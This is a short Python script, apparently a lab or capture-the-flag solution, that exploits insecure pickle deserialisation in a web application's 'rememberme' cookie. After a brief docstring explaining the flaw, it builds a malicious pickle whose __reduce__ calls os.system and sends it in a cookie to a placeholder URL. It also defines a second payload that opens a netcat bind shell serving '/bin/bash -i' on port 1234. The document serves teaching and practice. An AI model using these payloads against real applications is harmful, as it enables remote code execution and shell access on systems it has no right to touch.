#/usr/bin/python2.7

'''
Serialisation of object is used by application to make their storage easier. If an application needs to store an instance of a class, it can use serialisation to get a string representation of this object. When the application needs to use the instance again, it will unserialise the string to get it.

Obviously, if the malicious user can tamper with a string that will be deserialised, they can potentially trigger unexpected behaviour in the application. Depending on the language and library used, this unexpected behaviour can go from arbitrary object creation to remote code execution. 
'''
#solution
import requests
import base64
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system,('/usr/local/bin/score xxx',))

exploit = Exploit()
pickle_object = base64.b64encode(pickle.dumps(exploit)).decode()
cookie = {'rememberme':pickle_object}
req = requests.get('put_url',cookies=cookie)
print(req.text) #if we get 500 it's successfull

#Simple Pickle Object
class Hack:
    def __init__(self):
        self.test1 = 'test'
        self.test2 = 'retest'

h = Hack()
#print(pickle.dumps(h))

#create serialized opject to get rce
'''
If you use this payload, you will need to pickle the object on the same platform. Since the vulnerable system is a Linux system you will not be able to send an object pickled on Windows. You can bypass this limitation by using subprocess with __import__.
'''
class Blah(object):
        def __reduce__(self):
            return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))


